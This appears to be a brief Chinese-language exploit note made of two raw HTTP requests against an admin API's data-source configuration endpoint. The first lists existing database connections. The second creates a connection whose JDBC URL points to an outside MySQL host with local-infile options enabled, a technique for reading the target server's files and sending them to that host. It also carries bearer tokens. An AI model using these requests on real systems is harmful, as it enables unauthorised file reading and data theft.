查看数据库连接
```
GET /admin-api/infra/data-source-config/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 47.11
Authorization: Bearer 68c0327d71ac4a06ad0a2d06d61da5b4
Origin: http://8.135
tenant-id: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Referer: http://8.135/

```
直接jdbc
```
POST /admin-api/infra/data-source-config/create HTTP/1.1
Host: 8.115:48080
tenant-id: 1
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Authorization: Bearer 500a5367c8ee447f90c3bdab633e1e2d
Pragma: no-cache
Content-Type: application/json
Accept: application/json, text/plain, */*
Origin: http://.15
Referer: http://8.15/
Content-Length: 150

{"name":"test","url":"jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","username":"test","password":"test"}
```